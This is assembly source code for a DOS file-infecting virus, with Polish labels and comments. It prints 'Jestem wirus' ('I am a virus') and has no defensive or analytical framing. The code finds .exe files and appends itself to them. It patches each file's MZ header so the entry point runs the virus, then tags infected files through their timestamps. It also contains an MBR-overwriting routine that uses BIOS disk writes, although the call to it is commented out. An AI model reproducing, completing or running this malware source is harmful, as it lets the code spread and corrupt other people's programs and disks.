format mz
entry main:start
stack 100h

P21H_TEKST_$_WYPISZ equ 9h
P21H_P_BUFOR_ADRES_POBIERZ equ 2fh
P21H_P_DATA_CZAS_POBIERZ equ 5700h
P21H_DATA_CZAS_ZAPISZ equ 5701h
P21H_PLIK_SZUKAJ_MASKA equ 4eh
P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
P21H_PLIK_OTWORZ equ 3d02h
P21H_PLIK_ODCZYTAJ equ 3f00h
P21H_PLIK_ZAPISZ equ 4000h
P21H_PLIK_ZAMKNIJ equ 3eh
P21H_PLIK_WSKAZNIK_PRZESUN equ 4200h
P21H_PLIK_WSKAZNIK_POCZATEK equ 00h
P21H_PLIK_WSKAZNIK_KONIEC equ 02h
P21H_ZAMKNIJ equ 4c00h

PLIK_NAZWA_OFS equ 1eh
PLIK_ROZMIAR_OFS equ 4h
P_NAGLOWEK_ROZMIAR_OFS equ 8h
P_POCZATEK_SEGMENT_OFS equ 16h
P_POCZATEK_OFFSET_OFS equ 14h
PLIK_NAGLOWEK_DLUGOSC equ 20h
PLIK_TYP equ 'MZ'
ZARAZONY_MASKA equ 0ffh

segment main

tablica_partycji_poczatek:
  xor ax, ax
  mov ss, ax
  mov sp, 7c00h
  int 12h
  mov cl, 6
  shl ax, cl
  mov cx, 100h
  sub ax, cx
  mov [adres], ax
  mov dx, 80h
  mov cx, 2
  mov es, ax
  mov bx, 0
  mov ax, 0206h
  int 13h
  mov ax, [adres]
  push ax
  mov ax, czesc_inicjujaca
  push ax
  retf
adres dw ?
tablica_partycji_koniec:
czesc_inicjujaca:
  mov ax, cs
  mov ss, ax
  mov ds, ax
  mov sp, bufor + 100h
  mov dx, 80h
  mov cx, 9
  xor ax, ax
  mov es, ax
  mov bx, 7c00h
  push es
  push bx
  mov ax, 0201h
  int 13h
  push ds
  push ax
  mov ax, 0b800h
  mov ds, ax
  mov al, 'A'
  mov [0], al
  mov al, 1eh
  mov [1], al
  pop ax
  pop ds
  retf

;segment dane
plik_poczatek_ip dw ?
plik_poczatek_cs dw ?
plik_maska db "*.exe", 0
plik_uchwyt dw ?
plik_data dw ?
plik_czas dw ?
plik_dlugosc_seg dw ?
plik_dlugosc_ofs dw ?
plik_naglowek dw ?
bufor: times 200h db ?

informacja db "Jestem wirus ]:> $"

; wykonywane po uruchomieniu programu
plik_poczatek:
  push ds
  push es
; miejsce na psoty
  ;call zarazenie_tablica_partycji
  call zarazenie_plik
  mov dx, cs
  mov ds, dx
  mov ah, P21H_TEKST_$_WYPISZ
  mov dx, informacja
  int 21h
; skok do pierwotnego początku programu
  mov dx, cs
  mov ds, dx
  mov ax, [plik_poczatek_cs]
  mov bx, [plik_poczatek_ip]
  pop es
  pop ds
  mov cx, ds
  add ax, cx
  add ax, 10h
  push ax
  push bx
  retf

; zarażanie
zarazenie_plik:
  push ax
  push bx
  push cx
  push dx
  push ds
  push es
  pushf
  mov dx, cs
  mov ds, dx

  mov ah, P21H_PLIK_SZUKAJ_MASKA
  mov dx, plik_maska
  mov cx, 0fh
  int 21h
; jc - nie znaleziono
  jc zarazanie_plik_koniec

plik_znaleziono:
  mov ah, P21H_P_BUFOR_ADRES_POBIERZ
  int 21h
  mov cx, es
  mov ds, cx
  mov dx, bx
  add dx, PLIK_NAZWA_OFS
  mov ax, P21H_PLIK_OTWORZ
  int 21h
  mov cx, cs
  mov ds, cx
  mov bx, ax
  mov [plik_uchwyt], ax
; sprawdzenie czy plik jest już zarażony
  mov ax, P21H_P_DATA_CZAS_POBIERZ
  int 21h
  cmp cl, ZARAZONY_MASKA
  jne do_zarazenia
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
  int 21h
  jnc plik_znaleziono
  jmp zarazanie_plik_koniec
  
do_zarazenia:
  mov cl, ZARAZONY_MASKA
  mov [plik_data], dx
  mov [plik_czas], cx
; pobranie długości pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov [plik_dlugosc_seg], dx
  mov [plik_dlugosc_ofs], ax
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov dx, bufor
  mov cx, PLIK_NAGLOWEK_DLUGOSC
  mov ax, P21H_PLIK_ODCZYTAJ
  int 21h
  cmp word [bufor], PLIK_TYP
  jne plik_oznacz
; zapisanie nowego rozmiaru pliku
  mov ax, koniec
  mov cl, 9
  shr ax, cl
  and ax, 1ffh
  mov cx, ax
  mov ax, word [bufor + PLIK_ROZMIAR_OFS]
  add ax, cx
  inc ax
  mov word [bufor + PLIK_ROZMIAR_OFS], ax
; zapamiętanie rozmiaru nagłówka
  mov ax, word [bufor + P_NAGLOWEK_ROZMIAR_OFS]
  mov [plik_naglowek], ax
; zapamiętanie segmentu pierwotnego początku programu
  mov ax, word [bufor + P_POCZATEK_SEGMENT_OFS]
  mov [plik_poczatek_cs], ax
; sprawdzenie długości pliku, jeśli zbyt długi to rezygnacja
  mov ax, [plik_dlugosc_seg]
  cmp ax, 02h
  jg plik_oznacz
; zapisanie segmentu nowego początku programu
  mov cl, 0ch
  shl ax, cl
  and ax, 0f000h
  mov dx, ax
  mov ax, [plik_dlugosc_ofs]
  mov cl, 04h
  shr ax, cl
  and ax, 0fffh
  add ax, dx
  mov dx, [plik_naglowek]
  sub ax, dx
  inc ax
  mov word [bufor + P_POCZATEK_SEGMENT_OFS], ax
; zapamiętanie offsetu pierwotnego początku programu
  mov ax, word [bufor + P_POCZATEK_OFFSET_OFS]
  mov [plik_poczatek_ip], ax
; zapisanie offsetu nowego początku programu
  mov ax, plik_poczatek
  mov word [bufor + P_POCZATEK_OFFSET_OFS], ax
; zapisanie uaktualnionego nagłówka pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov dx, bufor
  mov cx, PLIK_NAGLOWEK_DLUGOSC
  mov ax, P21H_PLIK_ZAPISZ
  int 21h
; dopisanie wirusa na koniec pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov ax, [plik_dlugosc_ofs]
  and ax, 000fh
  mov cx, 0fh
  cmp ax, 0
  je plik_dopisz_wirusa
  sub cx, ax
plik_dopisz_wirusa:
  inc cx
  mov dx, tablica_partycji_poczatek
  mov ax, P21H_PLIK_ZAPISZ
  int 21h
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov dx, tablica_partycji_poczatek
  mov ax, koniec
; wyrównanie długości pliku do 512
  mov cl, 9
  shr ax, cl
  inc ax
  shl ax, cl
  mov cx, ax
  mov ax, P21H_PLIK_ZAPISZ
  int 21h

plik_oznacz:
; oznaczenie pliku jako zarażony
  mov cx, [plik_czas]
  mov dx, [plik_data]
  mov ax, P21H_DATA_CZAS_ZAPISZ
  int 21h
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  
zarazanie_plik_koniec:
  popf
  pop es
  pop ds
  pop dx
  pop cx
  pop bx
  pop ax
  ret

zarazenie_tablica_partycji:
  push ds
  push es
  mov dx, 0080h
  mov cx, 0001h
  mov ax, cs
  mov es, ax
  mov bx, bufor
  mov ax, 0201h
  int 13h
  mov ax, cs
  mov ds, ax
  mov es, ax
  mov si, bufor
  mov di, tablica_partycji_poczatek
  cld
  mov cx, 18h
  rep cmpsb
  je z_tablica_partycji_koniec
  mov dx, 80h
  mov cx, 9
  mov ax, cs
  mov es, ax
  mov bx, bufor
  mov ax, 0301h
  int 13h
  mov cx, tablica_partycji_koniec - tablica_partycji_poczatek
  mov ax, cs
  mov ds, ax
  mov es, ax
  mov si, tablica_partycji_poczatek
  mov di, bufor
  cld
  rep movsb
  mov dx, 80h
  mov cx, 1
  mov ax, cs
  mov es, ax
  mov bx, bufor
  mov ax, 0301h
  int 13h
  mov dx, 80h
  mov cx, 2
  mov ax, cs
  mov es, ax
  mov bx, tablica_partycji_poczatek
  mov ax, 0306h
  int 13h
z_tablica_partycji_koniec:
  pop es
  pop ds
  ret

koniec:

start:
  ;call zarazenie_tablica_partycji
  call zarazenie_plik
  mov dx, cs
  mov ds, dx
  mov ah, P21H_TEKST_$_WYPISZ
  mov dx, informacja
  int 21h
; oczekiwanie na wciśnięcie klawisza
  mov ah, 0h
  int 16h
  mov ax, P21H_ZAMKNIJ
  int 21h
